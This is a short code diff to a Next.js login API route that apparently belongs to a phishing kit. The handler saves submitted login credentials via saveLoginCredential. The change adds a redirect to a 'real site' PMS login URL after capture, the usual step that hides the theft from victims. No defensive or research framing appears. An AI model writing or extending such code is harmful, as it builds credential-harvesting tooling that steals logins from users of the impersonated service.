@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from "next/server";
 import { saveLoginCredential } from "@/lib/credentials";
+import { REAL_SITE_URLS } from "@/lib/routes";
 
 export async function POST(request: NextRequest) {
   try {
@@ -21,7 +22,10 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    return NextResponse.json({ success: true });
+    return NextResponse.json({
+      success: true,
+      redirect: REAL_SITE_URLS.pmsLogin,
+    });
   } catch (err) {
     console.error("Login API error:", err);
     return NextResponse.json(
